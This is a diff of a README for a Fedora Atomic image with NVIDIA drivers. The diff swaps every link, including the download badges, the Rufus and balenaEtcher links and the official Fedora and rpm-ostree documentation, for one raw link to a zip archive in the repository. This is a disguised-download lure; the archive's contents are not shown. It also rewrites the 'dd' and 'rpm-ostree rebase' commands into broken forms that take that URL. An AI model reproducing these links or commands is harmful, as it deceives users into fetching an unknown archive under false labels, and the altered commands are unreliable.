@@ -1,6 +1,6 @@
 # 🐧 fedora-atomic-dev-nvidia - Stable Fedora with NVIDIA Support
 
-[![Download Fedora Nvidia](https://img.shields.io/badge/Download-fedora--atomic--dev--nvidia-blue?style=for-the-badge)](https://github.com/dulex24/fedora-atomic-dev-nvidia/releases)
+[![Download Fedora Nvidia](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This image is designed for modern desktop PCs and workstations.
 
 To get the latest version of fedora-atomic-dev-nvidia, visit the releases page by clicking the button below:
 
-[![Download from Releases](https://img.shields.io/badge/Go_to_Releases_page-orange?style=for-the-badge)](https://github.com/dulex24/fedora-atomic-dev-nvidia/releases)
+[![Download from Releases](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)
 
 On that page you will find the available images for download. Choose the latest stable release.
 
@@ -48,12 +48,12 @@ To install fedora-atomic-dev-nvidia, you will need to write the downloaded image
 
 Follow these instructions based on your current operating system:
 
-- **Windows:** Use a tool like [Rufus](https://rufus.ie/). Open Rufus, select your USB drive, choose the downloaded image file, and click Start.
-- **macOS:** Use the built-in Terminal commands or an app like [balenaEtcher](https://www.balena.io/etcher/). Open balenaEtcher, select the image, the USB drive, and flash it.
-- **Linux:** Use the `dd` command or graphical tools like [GNOME Disks](https://help.gnome.org/users/gnome-disks/stable/). For example:
+- **Windows:** Use a tool like [Rufus](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip). Open Rufus, select your USB drive, choose the downloaded image file, and click Start.
+- **macOS:** Use the built-in Terminal commands or an app like [balenaEtcher](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip). Open balenaEtcher, select the image, the USB drive, and flash it.
+- **Linux:** Use the `dd` command or graphical tools like [GNOME Disks](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip). For example:
 
   ```
-  sudo dd if=/path/to/image.img of=/dev/sdX bs=4M status=progress
+  sudo dd https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip of=/dev/sdX bs=4M status=progress
   ```
 
   Replace `/dev/sdX` with your USB device.
@@ -114,7 +114,7 @@ If you want to switch to a new image version, you can use the rebase function.
 - First, rebase to the unsigned latest image to get updated signing keys:
 
 ```
-sudo rpm-ostree rebase ostree-unverified-registry:ghcr.io/hovarak/fedora-atomic-dev-nvidia:latest
+sudo rpm-ostree rebase https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
 ```
 
 - Reboot the machine:
@@ -136,16 +136,16 @@ If you run into issues, here are some common tips:
 - Confirm your NVIDIA card is supported by the included drivers.
 - If updates fail, verify your internet connection.
 
-For more help, visit the [BlueBuild documentation](https://blue-build.org/how-to/setup/) which offers setup details related to this template.
+For more help, visit the [BlueBuild documentation](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip) which offers setup details related to this template.
 
 ---
 
 ## 📚 Additional Resources
 
-- Fedora Official Website: https://getfedora.org
-- Fedora NVIDIA Driver Guide: https://docs.fedoraproject.org/en-US/nvidia-driver/
-- rpm-ostree Documentation: https://rpm-ostree.readthedocs.io/en/latest/
-- Container Usage on Fedora: https://docs.fedoraproject.org/en-US/fedora/latest/containers/
+- Fedora Official Website: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
+- Fedora NVIDIA Driver Guide: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
+- rpm-ostree Documentation: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
+- Container Usage on Fedora: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
 
 ---
 
@@ -155,4 +155,4 @@ This project follows the Fedora Project's open-source guidelines. Contributions 
 
 ---
 
-[![Download Fedora Nvidia](https://img.shields.io/badge/Download-fedora--atomic--dev--nvidia-blue?style=for-the-badge)](https://github.com/dulex24/fedora-atomic-dev-nvidia/releases)
+[![Download Fedora Nvidia](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)
